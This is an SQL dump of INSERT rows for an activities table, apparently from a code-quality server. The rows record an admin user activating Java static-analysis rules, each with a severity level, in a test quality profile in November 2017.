INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3077, '2017-11-20 12:20:20.128', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2133;ruleKey=squid:S2133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0QgbbGRdfPp-rNp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3078, '2017-11-20 12:20:20.168', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2134;ruleKey=squid:S2134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0RIbbGRdfPp-rNq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3079, '2017-11-20 12:20:20.206', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2140;ruleKey=squid:S2140;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0RubbGRdfPp-rNr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3080, '2017-11-20 12:20:20.255', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2142;ruleKey=squid:S2142;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0SfbbGRdfPp-rNs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3081, '2017-11-20 12:20:20.32', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2147;ruleKey=squid:S2147;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0TgbbGRdfPp-rNt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3082, '2017-11-20 12:20:20.355', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2151;ruleKey=squid:S2151;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0UDbbGRdfPp-rNu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3083, '2017-11-20 12:20:20.391', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2153;ruleKey=squid:S2153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0UnbbGRdfPp-rNv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3084, '2017-11-20 12:20:20.43', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2154;ruleKey=squid:S2154;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0VObbGRdfPp-rNw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3085, '2017-11-20 12:20:20.476', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2157;ruleKey=squid:S2157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0V8bbGRdfPp-rNx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3086, '2017-11-20 12:20:20.523', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2159;ruleKey=squid:S2159;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0WrbbGRdfPp-rNy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3087, '2017-11-20 12:20:20.567', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2160;ruleKey=squid:S2160;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0XXbbGRdfPp-rNz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3088, '2017-11-20 12:20:20.636', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2165;ruleKey=squid:S2165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0YcbbGRdfPp-rN0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3089, '2017-11-20 12:20:20.679', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2166;ruleKey=squid:S2166;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0ZHbbGRdfPp-rN1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3090, '2017-11-20 12:20:20.728', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2167;ruleKey=squid:S2167;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0Z4bbGRdfPp-rN2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3091, '2017-11-20 12:20:20.823', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2168;ruleKey=squid:S2168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0bXbbGRdfPp-rN3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3092, '2017-11-20 12:20:20.869', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2175;ruleKey=squid:S2175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0cFbbGRdfPp-rN4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3093, '2017-11-20 12:20:20.911', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2176;ruleKey=squid:S2176;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0cvbbGRdfPp-rN5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3094, '2017-11-20 12:20:20.972', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2177;ruleKey=squid:S2177;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0dsbbGRdfPp-rN6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3095, '2017-11-20 12:20:21.006', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2178;ruleKey=squid:S2178;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0eObbGRdfPp-rN7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3096, '2017-11-20 12:20:21.045', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2183;ruleKey=squid:S2183;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0e1bbGRdfPp-rN8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3097, '2017-11-20 12:20:21.071', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2184;ruleKey=squid:S2184;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0fPbbGRdfPp-rN9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3098, '2017-11-20 12:20:21.106', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2185;ruleKey=squid:S2185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0fybbGRdfPp-rN-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3099, '2017-11-20 12:20:21.143', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2186;ruleKey=squid:S2186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0gXbbGRdfPp-rN_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3100, '2017-11-20 12:20:21.171', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2187;ruleKey=squid:S2187;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0gzbbGRdfPp-rOA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3101, '2017-11-20 12:20:21.207', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2188;ruleKey=squid:S2188;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0hXbbGRdfPp-rOB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3102, '2017-11-20 12:20:21.249', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2189;ruleKey=squid:S2189;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0iBbbGRdfPp-rOC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3103, '2017-11-20 12:20:21.288', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2200;ruleKey=squid:S2200;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0iobbGRdfPp-rOD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3104, '2017-11-20 12:20:21.335', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2201;ruleKey=squid:S2201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0jXbbGRdfPp-rOE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3105, '2017-11-20 12:20:21.379', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2204;ruleKey=squid:S2204;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0kDbbGRdfPp-rOF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3106, '2017-11-20 12:20:21.424', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2209;ruleKey=squid:S2209;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0kwbbGRdfPp-rOG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3107, '2017-11-20 12:20:21.485', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2222;ruleKey=squid:S2222;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0ltbbGRdfPp-rOH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3108, '2017-11-20 12:20:21.569', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2225;ruleKey=squid:S2225;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0nBbbGRdfPp-rOI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3109, '2017-11-20 12:20:21.706', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2226;ruleKey=squid:S2226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0pKbbGRdfPp-rOJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3110, '2017-11-20 12:20:21.784', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2230;ruleKey=squid:S2230;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0qYbbGRdfPp-rOK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3111, '2017-11-20 12:20:21.856', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2232;ruleKey=squid:S2232;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0rfbbGRdfPp-rOL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3112, '2017-11-20 12:20:21.924', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2235;ruleKey=squid:S2235;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0skbbGRdfPp-rOM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3113, '2017-11-20 12:20:21.968', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2236;ruleKey=squid:S2236;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0tQbbGRdfPp-rON');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3114, '2017-11-20 12:20:22.012', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2251;ruleKey=squid:S2251;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0t8bbGRdfPp-rOO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3115, '2017-11-20 12:20:22.06', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2252;ruleKey=squid:S2252;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0usbbGRdfPp-rOP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3116, '2017-11-20 12:20:22.105', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2254;ruleKey=squid:S2254;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0vZbbGRdfPp-rOQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3117, '2017-11-20 12:20:22.149', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2259;ruleKey=squid:S2259;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0wFbbGRdfPp-rOR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3118, '2017-11-20 12:20:22.2', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2272;ruleKey=squid:S2272;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0w4bbGRdfPp-rOS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3119, '2017-11-20 12:20:22.265', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2273;ruleKey=squid:S2273;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0x5bbGRdfPp-rOT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3120, '2017-11-20 12:20:22.311', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2274;ruleKey=squid:S2274;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0ynbbGRdfPp-rOU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3121, '2017-11-20 12:20:22.352', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2275;ruleKey=squid:S2275;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0zQbbGRdfPp-rOV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3122, '2017-11-20 12:20:22.388', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2276;ruleKey=squid:S2276;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0z0bbGRdfPp-rOW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3123, '2017-11-20 12:20:22.41', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2277;ruleKey=squid:S2277;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX00KbbGRdfPp-rOX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3124, '2017-11-20 12:20:22.434', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2278;ruleKey=squid:S2278;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX00ibbGRdfPp-rOY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3125, '2017-11-20 12:20:22.505', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2293;ruleKey=squid:S2293;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX01pbbGRdfPp-rOZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3126, '2017-11-20 12:20:22.551', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2326;ruleKey=squid:S2326;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX02XbbGRdfPp-rOa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3127, '2017-11-20 12:20:22.591', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2386;ruleKey=squid:S2386;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX02_bbGRdfPp-rOb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3128, '2017-11-20 12:20:22.651', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2387;ruleKey=squid:S2387;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX037bbGRdfPp-rOc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3129, '2017-11-20 12:20:22.725', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2388;ruleKey=squid:S2388;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX05FbbGRdfPp-rOd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3130, '2017-11-20 12:20:22.782', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2390;ruleKey=squid:S2390;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX05-bbGRdfPp-rOe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3131, '2017-11-20 12:20:22.815', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2391;ruleKey=squid:S2391;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX06fbbGRdfPp-rOf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3132, '2017-11-20 12:20:22.848', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2437;ruleKey=squid:S2437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX07AbbGRdfPp-rOg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3133, '2017-11-20 12:20:22.886', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2438;ruleKey=squid:S2438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX07mbbGRdfPp-rOh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3134, '2017-11-20 12:20:22.924', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2440;ruleKey=squid:S2440;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX08MbbGRdfPp-rOi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3135, '2017-11-20 12:20:22.958', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2441;ruleKey=squid:S2441;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX08ubbGRdfPp-rOj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3136, '2017-11-20 12:20:22.994', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2442;ruleKey=squid:S2442;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX09SbbGRdfPp-rOk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3137, '2017-11-20 12:20:23.033', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2445;ruleKey=squid:S2445;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX095bbGRdfPp-rOl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3138, '2017-11-20 12:20:23.071', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2446;ruleKey=squid:S2446;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0-fbbGRdfPp-rOm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3139, '2017-11-20 12:20:23.125', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2447;ruleKey=squid:S2447;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0_VbbGRdfPp-rOn');
